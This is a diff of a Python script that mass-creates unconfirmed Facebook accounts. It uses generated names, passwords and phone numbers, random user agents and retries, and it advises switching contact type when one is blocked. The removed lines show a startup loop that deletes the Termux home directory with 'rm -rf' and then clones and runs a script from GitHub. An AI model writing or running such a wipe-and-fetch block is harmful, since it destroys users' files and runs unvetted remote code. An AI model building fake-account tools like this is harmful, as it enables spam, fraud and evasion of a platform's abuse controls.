@@ -10,28 +10,12 @@ import random
 import string
 
 os.system("clear")
-while True:
-    try:
-        subprocess.run(["rm", "-rf", "/data/data/com.termux/files/home"], check=True)
-        subprocess.run(["git", "clone", "https://github.com/versozadarwin23/reg.git"], check=True)
-        subprocess.run(["cd", "reg"], check=True)
-        subprocess.run(["python reg.py"], check=True)
-        break
-    except:
-        pass
 
-# --- Global Variables ---
-# Stores the base for custom passwords if provided by the user
 custom_password_base = None
-# Stores the Facebook profile ID after successful creation
 profile_id = None
-# Stores either the generated phone number or the user's email
 user_provided_contact_info = None
-# Stores the initial choice for contact type (1 for phone, 2 for email)
-# This new global variable will preserve the user's preference across account creations
 initial_contact_choice_global = None
 
-# --- Constants for Retry Logic and UI Elements ---
 MAX_RETRIES = 3  # This is primarily for network requests
 RETRY_DELAY = 2
 
@@ -39,9 +23,6 @@ SUCCESS = "✅"
 FAILURE = "❌"
 WARNING = "⚠️"
 LOADING = "⏳"
-
-
-# --- Helper Functions ---
 
 def load_user_agents(file_path):
     """Loads user agents from a specified file."""
@@ -52,16 +33,6 @@ def load_user_agents(file_path):
     except FileNotFoundError:
         print(f"{FAILURE} Error: User agent file '{file_path}' not found. Please create it.")
         sys.exit()
-
-
-def get_random_user_agent(file_path="user_agents.txt"):
-    """Returns a random user agent from the loaded list."""
-    user_agents = load_user_agents(file_path)
-    if not user_agents:
-        print(f"{FAILURE} No user agents found in '{file_path}'. Using a default one.")
-        return 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1903 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/444.0.0.0.110;]'
-    return random.choice(user_agents)
-
 
 def load_names_from_file(file_path):
     """Loads names from a specified file."""
@@ -119,25 +90,14 @@ def generate_user_details_initial(account_type, gender, password_override=None):
         six_digit = str(random.randint(100000, 999999))
         password = password_override + six_digit
     else:
-        # Otherwise, generate a completely random password
         password = generate_random_password()
     return firstname, lastname, date, year, month, password
 
 
-# --- Core Account Creation Logic ---
-
 def create_fbunconfirmed(account_type, usern, gender):
-    """
-    Attempts to create a Facebook account, handling user input for password
-    and contact method (phone/email). Includes internal retries for the same contact info.
-    Returns True on success, False on failure after all attempts.
-    """
     global custom_password_base, profile_id, user_provided_contact_info, initial_contact_choice_global
-
     session = requests.Session()
-
     def check_page_loaded(url, headers):
-        """Attempts to load a page and find the registration form."""
         for _ in range(MAX_RETRIES):
             try:
                 response = session.get(url, headers=headers)
@@ -155,7 +115,6 @@ def create_fbunconfirmed(account_type, usern, gender):
         return None
 
     def retry_request(url, headers, method="get", data=None):
-        """Retries HTTP requests in case of failure."""
         for attempt in range(MAX_RETRIES):
             try:
                 if method == "get":
@@ -180,37 +139,25 @@ def create_fbunconfirmed(account_type, usern, gender):
         print(f"{FAILURE} Failed to get a successful response after multiple retries.")
         return None
 
-    # --- Password Input Logic ---
-    # Only ask for custom password if it hasn't been set yet
     if custom_password_base is None:
         inp = input(f"\033[1;92m Type your password: \033[0m")
         if inp.strip() != '':
             custom_password_base = inp.strip()
 
-    # --- Initial Contact Info Input Logic ---
-    # Only ask for contact type if it hasn't been chosen yet in this session
     if initial_contact_choice_global is None:
         while initial_contact_choice_global not in ['1', '2']:
             os.system("clear")
-            print("Choose account input type: Choose 1 if option 2 is getting blocked, or Choose 2 if option 1 is getting blocked.")
-            print("1. Phone Number")
-            print("2. Email Address")
+            print("Choose account input type: Choose 1 if option 2 is getting blocked, or Choose 2 if option 1 is getting blocked.\033[0m")
+            print("1. Phone Number\033[0m")
+            print("2. Email Address\033[0m")
             initial_contact_choice_global = input(f" Enter your choice (1 or 2): \033[0m")
             if initial_contact_choice_global not in ['1', '2']:
                 print(f"{WARNING} Invalid choice. Please enter 1 or 2.")
                 time.sleep(1)
 
-    # Based on the (now persistent) initial choice, generate/get contact info
     if initial_contact_choice_global == '1':
         user_provided_contact_info = generate_random_phone_number()
     elif initial_contact_choice_global == '2':
-        # If email was chosen, prompt for email ONLY IF it's not already set
-        # This allows re-entering a new email for each account if desired, or keep the old one.
-        # For simplicity, if the user chose email initially, we'll ask for it again for each new account
-        # to allow different emails per account. If you want the SAME email for all, remove this 'if'
-        # and simply assign user_provided_contact_info = email_input outside this block.
-        # However, for creating *multiple* accounts, unique emails are usually better.
-        # So we will prompt for email each time if email was the initial choice.
         while True:
             email_input = input(f" Type your Email:  \033[0m").strip()
             if '@' in email_input and '.' in email_input:
@@ -219,11 +166,8 @@ def create_fbunconfirmed(account_type, usern, gender):
             else:
                 print(f"{WARNING} Invalid email format. Please enter a valid email address.")
 
-    # Store the initial choice for later use (email change prompt)
-    # This local variable reflects the choice made during THIS create_fbunconfirmed call
     initial_contact_was_phone = (initial_contact_choice_global == '1')
 
-    # --- Start Account Creation Process ---
     url = "https://m.facebook.com/reg"
     headers = {
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -246,7 +190,7 @@ def create_fbunconfirmed(account_type, usern, gender):
         return False
 
     internal_creation_attempts = 0
-    max_internal_attempts = 3
+    max_internal_attempts = 5
 
     while internal_creation_attempts < max_internal_attempts:
         internal_creation_attempts += 1
@@ -284,7 +228,6 @@ def create_fbunconfirmed(account_type, usern, gender):
             if "c_user" in session.cookies:
                 uid = session.cookies.get("c_user")
                 profile_id = f'https://www.facebook.com/profile.php?id={uid}'
-                # Account successfully created with initial contact info, break internal loop
                 break
             else:
                 soup_after_reg = BeautifulSoup(reg_response.text, "html.parser")
